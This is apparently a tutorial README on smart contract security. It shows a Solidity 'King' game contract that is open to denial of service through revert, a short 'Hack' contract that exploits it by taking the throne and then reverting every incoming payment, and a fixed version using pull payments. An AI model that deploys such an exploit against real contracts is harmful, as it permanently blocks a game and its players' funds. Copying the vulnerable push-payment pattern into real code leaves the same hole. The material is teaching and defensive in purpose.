# Smart_contract_security

DOS attack on a smart contract.

We will see how a contract  which rejects accepting ether is used to trigger a DOS attack on a smart contract .
We will also see a contract with similar functionality , but which is not vulnerable to DOS attacks.

"The King contract is a simple game where participants can become the king by sending more Ether than the current prize. The contract keeps track of the current king, the prize, and the contract owner."
```bash
contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() payable {
    owner = payable(msg.sender);
    king = payable(msg.sender);
    prize = msg.value;
  }

  receive() external payable {
    _becomeKing();
  }

  function becomeKing() external payable {
    _becomeKing();
  }

  function _becomeKing() internal {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value); //transfer method sends the specified amount of Ether and reverts the transaction if the transfer fails
    king = payable(msg.sender);
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}


```




State Variables

Here, king is the address of the current king, prize is the amount of Ether needed to become the king, and owner is the contract owner.

Constructor

The constructor sets the initial owner and king to the contract creator, and the initial prize to the Ether sent during contract deployment.

Receive Function

The receive function is triggered when the contract receives Ether, calling the internal _becomeKing function to update the king.

Become King Function

Participants can also explicitly call becomeKing to attempt to become the king. The _becomeKing function checks if the sent Ether is at least the current prize, transfers the Ether to the current king, and updates the king and prize.


The Vulnerability

The vulnerability lies in the king.transfer(msg.value) line. If the king is a contract that reverts on receiving Ether, the transfer will fail, causing a Denial of Service.

Let's see how this vulnerability can be exploited with the Hack contract.



The vulnerability lies in the king.transfer(msg.value) line. If the king is a contract that reverts on receiving Ether, the transfer will fail, causing a Denial of Service.

## Exploiting this vulnerability with a hack contract
```bash
contract Hack {
constructor(address payable target) payable {
    uint prize = King(target).prize();
       (bool ok,) = target.call{value: prize}("");
        require(ok, "tx failed");
    }
fallback() external payable {

    revert();
}

function withdraw() external {
       payable(msg.sender).transfer(address(this).balance);
   }

}
```

The Hack contract exploits the vulnerability by becoming the king and then blocking any subsequent Ether transfers.The constructor sends enough Ether to the King contract to become the king.The fallback function always reverts, preventing any Ether transfer to the Hack contract, thus causing the DoS.

# Mitigating the Vulnerability

Updated version of the King contract 

```bash
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address payable public king;
    uint public prize;
    address payable public owner;

    mapping(address => uint) public pendingWithdrawals;

    event NewKing(address indexed newKing, uint prize);

    constructor() payable {
        owner = payable(msg.sender);
        king = payable(msg.sender);
        prize = msg.value;
    }

    receive() external payable {
        _becomeKing();
    }

    function becomeKing() public payable {
        _becomeKing();
    }

    function _becomeKing() internal {
        require(msg.value >= prize || msg.sender == owner, "Insufficient value to become the king");
        
        if (king != address(0)) {
            pendingWithdrawals[king] += prize;
        }
        
        king = payable(msg.sender);
        prize = msg.value;

        emit NewKing(msg.sender, msg.value);
    }

    function withdraw() public {
        uint amount = pendingWithdrawals[msg.sender];
        require(amount > 0, "No funds to withdraw");

        pendingWithdrawals[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Withdrawal failed");
    }

    function _king() public view returns (address payable) {
        return king;
    }
}
```
This updated version of the King contract includes a mitigation against the DoS with revert vulnerability. Instead of transferring Ether directly to the previous king using transfer, it uses a pull payment mechanism. The previous king can withdraw their prize at their convenience.

The mapping function in this context is used to create a record of pending withdrawals for each address that has Ether to be claimed. It ensures that Ether owed to previous kings is stored and can be withdrawn later, rather than being transferred immediately when a new king is crowned. This avoids the risk of blocking the contract if the recipient rejects the transfer.
